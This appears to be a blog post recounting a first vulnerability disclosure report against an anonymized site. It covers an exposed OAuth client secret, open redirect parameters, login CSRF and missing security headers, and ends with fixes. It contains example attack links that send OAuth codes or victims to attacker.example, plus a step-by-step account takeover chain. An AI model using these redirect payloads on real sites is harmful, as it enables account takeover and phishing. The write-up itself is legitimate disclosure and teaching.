---
title: The First VDP
description: My first report through a VDP. An exposed OAuth secret and an open redirect that chain into account takeover.
updated: 2026-11-19
---

# The First VDP

## What is a VDP

VDP stands for Vulnerability Disclosure Program. It is a public promise from a
company that says: if you find a security problem in our systems and report it
to us the right way, we will listen and we will not take legal action against
you. Unlike a bug bounty there is usually no money involved. You report, they
fix, everyone is safer.

This post is about my first report through one. It got triaged, so I am writing
it down. All names, domains and identifiers are anonymized. The target is called
target.com and its login service is auth.target.com.

## The short version

The login flow of the main site put its OAuth client secret in client side
JavaScript and sent it in the URL to the authentication service. On top of
that, the two parameters that decide where a user lands after logging in were
read straight from the URL with no validation at all. Put together, an attacker
could send a victim a real login link and receive the victim's OAuth tokens on
their own server. That is a full account takeover.

The login form also had no CSRF token, and neither site sent any security
headers.

## Finding 1: the client secret is public

Viewing the source of the home page showed an inline script with the OAuth
client credentials hardcoded in it:

```js
var authServiceUrl = 'https://auth.target.com';
var clientId = 'REDACTED_CLIENT_ID';
var clientSecret = 'REDACTED_CLIENT_SECRET';
```

A small function then built the login URL by appending both values as query
parameters:

```text
https://auth.target.com/oauth/ui/login?clientId=REDACTED_CLIENT_ID&clientSecret=REDACTED_CLIENT_SECRET&lang=en
```

The login page itself repeated them as hidden form fields:

```html
<input name="OAuthClientId" type="hidden" value="REDACTED_CLIENT_ID">
<input name="OAuthClientSecret" type="hidden" value="REDACTED_CLIENT_SECRET">
```

A client secret is supposed to stay on the server. Once it is in the browser,
anyone can act as the application towards the auth service.

## Finding 2: an open redirect in the OAuth flow

The same script decided where to send the user after login. It read
`redirectUri` from the address bar and used it as is:

```js
var redirectUri = getQueryParam('redirectUri');
var effectiveRedirectUri = redirectUri || encodeURIComponent(postAuthRedirectUrl);
```

So this link was enough:

```text
https://www.target.com/en/member/login/?redirectUri=https://attacker.example/steal
```

The victim sees the real login page and logs in with their real password. The
auth service then sends them, together with the OAuth authorization code, to
attacker.example. The attacker uses that code to get into the account.

A second parameter, `goto`, had the same problem:

```js
var gotoParam = getQueryParam('goto');
var effectiveRedirect = gotoParam || modelRedirectUrl;
var postAuthRedirectUrl = postAuthRedirectBase;
if (effectiveRedirect) {
    postAuthRedirectUrl += '?goto=' + encodeURIComponent(effectiveRedirect);
}
```

```text
https://www.target.com/en/member/login/?goto=https://attacker.example/phish
```

After login the user is bounced through the site's own redirect endpoint and
lands on the attacker's page, which makes for a very convincing phishing link.

## Finding 3: no CSRF token on the login form

The login form on auth.target.com had only four fields: the client id, the
client secret, the username and the password. No anti CSRF token.

That allows login CSRF. An attacker hosts a page that silently submits the form
with the attacker's own credentials, so the victim ends up logged in to the
attacker's account. Anything the victim then saves, like personal details or
payment information, lands in an account the attacker controls.

## Finding 4: no security headers

Neither the main site nor the auth service sent any of the usual protection
headers. No Strict-Transport-Security, X-Frame-Options, Content-Security-Policy,
X-Content-Type-Options, Referrer-Policy or Permissions-Policy. The responses
only carried caching headers.

Two things follow from that:

- **Clickjacking.** The login page can be framed on another site and the user
  tricked into typing or clicking inside it.
- **The secret leaks through the Referer header.** With no Referrer-Policy and
  the secret sitting in the URL, every third party resource the page loads can
  receive it.

## Impact

The serious part is the chain of findings 1 and 2:

1. The attacker builds a login link with a `redirectUri` pointing to their server.
2. The victim opens it and sees the genuine login page.
3. The victim logs in with their real credentials.
4. The auth service sends the authorization code to the attacker.
5. The attacker uses it to take over the account, with access to personal data,
   bookings, loyalty points and saved payment methods.

## What should be fixed

- Keep the client secret on the server. A browser based login should use the
  authorization code flow with PKCE, which needs no secret in the client.
- Validate `redirectUri` and `goto` against a strict allowlist of the site's own
  URLs, on the server.
- Add an anti CSRF token to the login form.
- Send the standard security headers, at least HSTS, a CSP with
  `frame-ancestors`, and a Referrer-Policy.

## What I took from it

None of this needed special tools. It was all in the page source and the
network tab. Reading the JavaScript a site ships to your own browser is still
one of the best places to start.
